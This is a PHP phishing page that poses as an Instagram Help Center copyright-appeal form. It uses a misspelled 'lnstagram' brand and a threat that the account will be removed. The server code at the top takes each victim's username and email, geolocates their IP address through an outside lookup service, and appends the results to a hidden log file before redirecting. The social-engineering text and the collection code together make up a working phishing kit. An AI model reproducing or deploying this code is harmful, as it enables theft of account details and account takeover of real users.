<?php
error_reporting(0);

if($_POST){
$nickk = $_POST['isim'];
$mail = $_POST['mail'];

$ip = $_SERVER['REMOTE_ADDR'];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");

$file = fopen('panzer.php', 'a');  
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<style>

    .center {
      
      margin: 0 auto;
      
    }

    .awesome {
      
      color:#313131;
      -webkit-animation:colorchange 10s infinite alternate;
      
      
    }

    @-webkit-keyframes colorchange {
      0% {
        
        color: blue;
      }
      
      10% {
        
        color: #8e44ad;
      }
      
      20% {
        
        color: #1abc9c;
      }
      
      30% {
        
        color: #d35400;
      }
      
      40% {
        
        color: blue;
      }
      
      50% {
        
        color: #34495e;
      }
      
      60% {
        
        color: blue;
      }
      
      70% {
        
        color: #2980b9;
      }
      80% {
     
        color: #f1c40f;
      }
      
      90% {
     
        color: #2980b9;
      }
      
      100% {
        
        color: pink;
      }
    }
</style>

<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font class='awesome' style='font-family:Arial'>
<font class='awesome' color='red'>Kullanıcı Adı: </font><font color='white'>".$nickk."</font><br>
<font class='awesome' color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font class='awesome' color='red'> Mail Adresi: </font><font color='white'>".$mail."</font><br>
<font class='awesome' color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font class='awesome' color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font class='awesome' color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font class='awesome' color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
</font>
<hr>
<br>

"); 
fclose($file);

    header("Location: confirmed.php?nick=".$nickk);
}

    ?>


<html><head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"> 
  <title>lnstagram Help Center</title> 
  <link rel="icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png"> 
  <style>
   @media screen and (min-width: 1000px){
    body{
     background: #fafafa;
     font-family: arial;
   }
   .header{
     background-color: #ffffff;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 60px;
     border-bottom: 1px solid #efefef;
   }
   #arainput{
	 background-color: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 215px;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: inline-block;
	 margin-left: 150px;
	 position: relative;
	 top: -10px;
	}
   #araresim{
     width: 13px;
	 position: relative;
	 top: -5px;
	 left: -245px;
   }
   #arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #logo{
	width: 180px;
	height: 37px;
	background: url("https://i.imgyukle.com/2020/06/30/C32Xao.png") no-repeat;
	background-size: cover;
	display: inline-block;
	margin-left: 6%;
   }
   #kutu{
     margin-top: 60px;
     background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 0 0 3px 3px;
     margin-left: 5px;
	 width: 990px;
	 text-align: left;
   }
   #ara{
     border-bottom: 1px solid #dbdbdb;
     width: 98%;
     padding-left: 20px;
     padding-top: 6px;
     padding-bottom: 6px;
     font-size: 16px;
     color: #999999;
     font-weight: 600;
   }
   .lusyoffi a{
     width: 228px;
     height: 21px;
     padding: 16px;
     display: inline-block;
     color: #262626;
       font-size: 14px;
     text-decoration: none;
   }
   .lusyoffi{
     display: block;
   }
   .lusyoffi:hover{
     border-left: 2px solid #bdbcbc;
   }
   #yan{
     border-right: 1px solid #dbdbdb;
     display: block;
     width: 300px;
     height: 737px;
     float: left;
   }
   #ic{
     padding-left: 30px;
     padding-right: 30px;
     padding-top: 30px;
       padding-bottom: 150px;
     display: inline-block;
     width: 610px;
   }
   #footer b {
     font-size: 12px;
     color: #262626;
     display: inline-block;
     margin-right: 30px;
     margin-left: 8px;
     float: right;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
     margin-top: 30px;
     display: inline-block;
   }
    #lusy123{
     background: url("https://teamdarkpirates.com/wp-content/uploads/2019/08/Instagram-icono.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 28%;
	 width: 40px;
	 height: 40px;
	}
    }
    
    
    @media screen and (max-width: 1000px){
   body{
     background: #ffffff;
     font-family: arial;
   }
   #yan{
     display: none;
   }
   #kutu{
	text-align: left;
   }
   .header{
     background-color: #fafafa;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 120px;
     text-align: center;
   }
   #logo{
     background: url("resim/logo1.png") no-repeat; 
     display: block;
     width: 173px;
     background-size: cover;
     height: 36px;
	 margin: auto;
	 margin-top: 10px;
   }
    #arainput{
	 background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 90%;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: block;
	 margin: auto;
	 margin-top: 20px;
	 margin-left: 15px;
	}
	#arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #araresim{
	position: relative;
	left: -47%;
	top: -24px;
   }
   #ara{
     border: 1px solid #dbdbdb;
     width: 100%;
     padding-left: 60px;
     font-size: 14px;
     color: #999999;
     font-weight: 600;
	 position: absolute;
	 right: 0px;
	 left: 0px,
	 display: block;
   }
   #ara p{
	padding-left: 20px;
   }
    #ic{
     padding-left: 10px;
     padding-right: 30px;
     padding-top: 70px;
     padding-bottom: 20px;
   }
    #footer b {
     font-size: 12px;
     color: #262626;
     display: block;
     margin-top: 20px;
     margin-left: 8px;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
   }
   #lusy123{
     background: url("https://i.imgyukle.com/2020/07/04/C9EoWs.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 70%;
	 width: 50px;
	 height: 50px;
	}
    }
	
	
	
   #ic b{
     color: #1C1E21;
   }
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 100px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
   #ic b{
     color: #1C1E21;
   }
   
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #ic p a{
     color: #3897f0;
     text-decoration: none;
   }
   form{
     color: #90949c;
     font-size: 12px;
   }
   form label{
     font-weight: 600;
     line-height: 1.538;
     margin-top: 10px;
     padding: 0px;
   }
   .m{
     width: 300px;
     border: 1px solid #dddfe2;
     color: #1d2129;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
      .cc{
     width: 300px;
background:#fafafa;
     border: 1px solid #dedede;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
   form span{
     text-decoration: none;
     color: #90949c;
     line-height: 1.5;
   }
   .lusypaw{
     display: block;
     margin-top: 10px; 
   }
   .lusy{
     color: #1c1e21;
     width: 50px;
     margin-left: -54px;
     background: none;
     border: none;
     font-weight: bold;
     outline: none;
     font-size: 12px;
     display: none;
   }
   #btn{
     line-height: 26px;
     padding: 0 10px;
     background-color: #4267b2;
     color: #ffffff;
     font-weight: bold;
     text-align: center;
     border: 1px solid #4267b2;
     border-radius: 2px;
     margin-top: 10px;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
	#tik{
	 width: 20px;
	 position: relative;
	 top: 3px;
	}
	#lusyoffic{
	 display: none;
	}
	#lusyisafk{
	 width: 50px;
	 display: none;
	}
  </style>

 
 </head> 
 <body> 
<img src="https://thumbor.sd-cdn.fr/sHaj_Qv3a99Nj0vOdzrQAi9TaR8=/fit-in/1909x886/cdn.sd-cdn.fr/wp-content/uploads/2016/05/instagram-nouveau-logo-1.png" id="lusyisafk">
 <div id="lusyofficial" style="display: none;">
 <div id="lusy123"> </div>
 </div>
<div id="lusyoffic" style="display: block;">
   <div class="header"> 
  <div id="logo"> </div>
	<input type="text" placeholder="How can we help?" id="arainput">
  </div> 
  <center>
  <div id="kutu"> 
   <div id="ara"> 
    <p> Help Center </p> 
   </div> 
   <div id="yan"> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Using Instagram</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Managing Your Account</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Troubleshooting and Login Help</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Privacy and Safety Center</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Instagram for Businesses</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
   </div> 
   <div id="ic"> 
    <b>Appeal to Copyright Infringement</b>
    <p>As lnstagram, we remove accounts that violate our copyright laws.
If you appeal, we will review your account.
We'll contact you by email later.
<br>If you do not provide feedback, we will remove your account.
<br><b>The reason we ask for this information is to verify that you are the true owner of your account.</b></p> 

	<form method="POST"> 
     <label>Full Name</label> 
     <br> 
     <input type="text" class="m" id="isimm" name="full_name" required=""> 
     <br> 
     <div class="lusypaw"> 
      <label>Your Username</label> 
      <br> 
      <span> [e.g. If the link to your Instagram account is instagram.com/[username], please enter "username" in this field]</span> 
      <br> 
      <input type="text" id="usernamee" class="m" value="" name="isim" required=""> 
     </div> 
     <div class="lusypaw"> 
     
      <br>
      <label>Email Address</label> 
      <br>
       <span> [Email address linked to your account] </span>
      <br> 
      <input type="email" id="maill" class="m" name="mail" required=""> 

     </div> 
	 

<div class="lusypaw"> 
 <select name="tip" id="tur" class="cc">
  <option value="volvo">Choose your account category</option>
  <option value="saab">News/Media</option>
  <option value="saab">Sports</option>
  <option value="saab">Government/Politics</option>
  <option value="saab">Music</option>
  <option value="saab">Fashion</option>
  <option value="mercedes">Entertainment</option>
  <option value="audi">Blogger/Influencer</option>
    <option value="mercedes">Business/Brand/Organization</option>
      <option value="mercedes">Other</option>
</select>
     </div> 
<br>
	
     <button id="btn" name="submit">Submit</button>

</form> 
   </div> 
  </div> 
  </center>
  <div id="footer"> 
   <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
   <a href="https://help.instagram.com/"> HELP </a> 
   <a href="https://www.instagram.com/developers/"> API </a> 
   <a href="https://www.instagram.com/about/jobs/"> JOBS </a> 
   <a href="https://www.instagram.com/legal/terms/"> TERMS </a> 
   <a href="https://www.instagram.com/legal/privacy/"> PRIVACY </a> 
   <b> © 2020 INSTAGRAM, INC. </b> 
   <br> 
   <label> ENGLISH (UK) </label> 
   <label> TURKISH </label> 
   <label> KURDÎ (KURMANCÎ)</label> 
   <label> العربية </label> 
   <label> ZAZA </label> 
   <label> DEUTSCH </label> 
   <label> РУССКИЙ </label> 
   <label> FRANÇAIS (FRANCE) </label> 
   <label> فارسی </label> 
   <label> ESPAÑOL</label> 
   <label> PORTUGUÊS (BRASIL) </label> 
  </div> 
 </div>
    </script>
</body></html>